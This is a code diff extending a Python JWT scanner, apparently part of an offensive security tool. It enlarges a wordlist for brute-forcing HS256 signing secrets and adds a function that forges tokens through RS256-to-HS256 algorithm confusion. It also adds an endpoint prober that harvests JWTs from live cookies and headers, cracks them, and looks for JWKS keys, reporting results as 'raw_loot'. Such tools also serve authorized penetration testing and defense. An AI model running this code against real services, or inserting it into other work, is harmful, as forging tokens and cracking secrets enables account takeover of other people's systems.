@@ -155,15 +155,16 @@ class JWTScanner:
         if len(parts) != 3: return None
         
         signing_input = f"{parts[0]}.{parts[1]}".encode()
-        header = json.loads(base64.urlsafe_b64decode(parts[0] + "==").decode())
+        header = self.decode_jwt(token).get("header", {})
         if header.get("alg") != "HS256": return None
         
         target_sig = base64.urlsafe_b64decode(parts[2] + "==")
         
-        # High probability secrets
+        # Expanded high probability secrets
         common_secrets = [
             "secret", "secret123", "password", "123456", "admin", "jwt", 
-            "jwt-secret", "dev", "test", "key", "root", "changeit"
+            "jwt-secret", "dev", "test", "key", "root", "changeit", "12345678",
+            "access", "guest", "welcome", "application", "default", "development"
         ]
         
         if logger: logger("JWT Expert: Initiating automated secret brute-force...", "INFO")
@@ -173,10 +174,78 @@ class JWTScanner:
             if sig == target_sig:
                 if logger: logger(f"CRITICAL: JWT Secret CRACKED -> {secret}", "CRITICAL")
                 return {
-                    "type": "JWT Weak Secret Cracked (CRITICAL)",
+                    "title": "CRITICAL: JWT Weak Secret Cracked",
                     "severity": "critical",
-                    "desc": f"The symmetric secret for HS256 was successfully brute-forced: `{secret}`. This allow full account takeover by forging arbitrary tokens.",
+                    "confidence": "certain",
+                    "description": f"The symmetric secret for HS256 was successfully brute-forced: `{secret}`. This allows full account takeover by forging arbitrary tokens.",
                     "token_preview": token[:40] + "...",
-                    "raw_loot": f"Cracked Secret: {secret}"
+                    "raw_loot": f"Cracked Secret: {secret}",
+                    "tool_source": "jwt_expert"
                 }
+
+        # Wave 6: Add potential Algorithm Confusion check (RS256 as HS256 with public key)
+        # We need a public key for this, often found in /.well-known/jwks.json
+        # For simplicity, we flag the candidate first.
         return None
+
+    def test_algorithm_confusion(self, token, public_key, logger=None):
+        """Tests for RS256 -> HS256 key confusion using a provided public key."""
+        import hmac
+        import hashlib
+        parts = token.split('.')
+        if len(parts) != 3: return None
+        
+        signing_input = f"{parts[0]}.{parts[1]}".encode()
+        # Sign with HS256 using the public key as the secret
+        sig = hmac.new(public_key.encode(), signing_input, hashlib.sha256).digest()
+        encoded_sig = base64.urlsafe_b64encode(sig).decode().strip('=')
+        
+        # Craft confused token
+        new_header = base64.urlsafe_b64encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).decode().strip('=')
+        confused_token = f"{new_header}.{parts[1]}.{encoded_sig}"
+        return confused_token
+
+    def probe_endpoint(self, url, logger=None):
+        """Probes a specific endpoint for JWTs in headers/cookies"""
+        findings = []
+        try:
+            r = self.session.get(url, timeout=5, allow_redirects=True)
+            
+            # Check Cookies and Auth Header
+            tokens = []
+            for cookie in r.cookies:
+                if self.jwt_pattern.match(cookie.value):
+                    tokens.append(("cookie", cookie.name, cookie.value))
+            
+            auth = r.headers.get("Authorization", "")
+            if "Bearer " in auth:
+                token = auth.replace("Bearer ", "").strip()
+                if self.jwt_pattern.match(token):
+                    tokens.append(("header", "Authorization", token))
+
+            for t_type, name, val in tokens:
+                if logger: logger(f"JWT Expert: Found JWT in {t_type} '{name}' at {url}", "SUCCESS")
+                audit = self.audit_token(val, url)
+                if audit: findings.extend(audit)
+                
+                # Brute force if HS256
+                brute = self.brute_force_secret(val, logger)
+                if brute: findings.append(brute)
+                
+                # Check for JWKS to attempt confusion
+                jwks_url = urljoin(url, "/.well-known/jwks.json")
+                try:
+                    jwks_r = self.session.get(jwks_url, timeout=2)
+                    if jwks_r.status_code == 200:
+                        findings.append({
+                            "title": "Discovery: JWKS Endpoint Found",
+                            "severity": "info",
+                            "description": f"Found public keys at {jwks_url}. Possible RS256 confusion candidate.",
+                            "tool_source": "jwt_expert"
+                        })
+                except: pass
+
+        except Exception as e:
+            if logger: logger(f"JWT Probe Error: {e}", "DEBUG")
+            
+        return findings
